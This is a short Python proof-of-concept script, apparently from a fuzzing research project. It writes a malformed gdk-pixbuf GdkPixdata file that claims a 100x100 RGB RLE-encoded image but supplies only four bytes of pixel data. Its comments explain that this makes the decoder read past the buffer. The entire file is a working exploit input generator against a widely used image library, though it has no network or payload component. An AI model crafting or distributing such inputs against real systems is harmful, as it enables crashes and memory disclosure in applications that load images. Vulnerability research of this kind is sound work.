#!/usr/bin/env python3
import struct, os

poc_dir = "/data/ylwang/non-textfuzz/target/_poc/gdk-pixbuf/gdk-pixbuf_gdk-pixbuf_c"
os.makedirs(poc_dir, exist_ok=True)

magic = 0x47646b50
width = 100
height = 100
bpp = 3  # RGB
rowstride = width * bpp  # 300
# pixdata_type: encoding=RLE(0x02<<24) | sample_width=8bit(0x01<<16) | color=RGB(0x01) = 0x02010001
# From gdk-pixdata.h:
#   GDK_PIXDATA_ENCODING_RLE      = 0x02 << 24 = 0x02000000
#   GDK_PIXDATA_SAMPLE_WIDTH_8    = 0x01 << 16 = 0x00010000
#   GDK_PIXDATA_COLOR_TYPE_RGB    = 0x01
pixdata_type = 0x02010001

# Provide only a few RLE bytes: one repeat-run of 1 pixel (0x01 = repeat once, then RGB)
# This produces only 3 bytes of output, but we claim 100*100*3 = 30000 bytes needed
# When the RLE loop tries to produce 30000 bytes and runs out of input, it reads past the buffer
pixel_data = b'\x01\xff\x00\x00'  # repeat-run: count=1, pixel=FF0000
# Only 4 bytes of RLE data, but image needs 30000 bytes decoded

# Set length to header + actual pixel data size (so deserializer accepts it)
# but the image dimensions demand much more
total_length = 24 + len(pixel_data)

header = struct.pack('>IIIIII',
    magic,
    total_length,
    pixdata_type,
    rowstride,
    width,
    height,
)

data = header + pixel_data

outfile = os.path.join(poc_dir, "vuln_002.gdkp")
with open(outfile, 'wb') as f:
    f.write(data)

print(f"Generated {outfile} ({len(data)} bytes)")
print(f"  Declared image: {width}x{height} RGB, needs {width*height*bpp} decoded bytes")
print(f"  Actual pixel_data: {len(pixel_data)} bytes (severely truncated)")
print(f"  This triggers OOB read when decoder reads past pixel_data buffer")
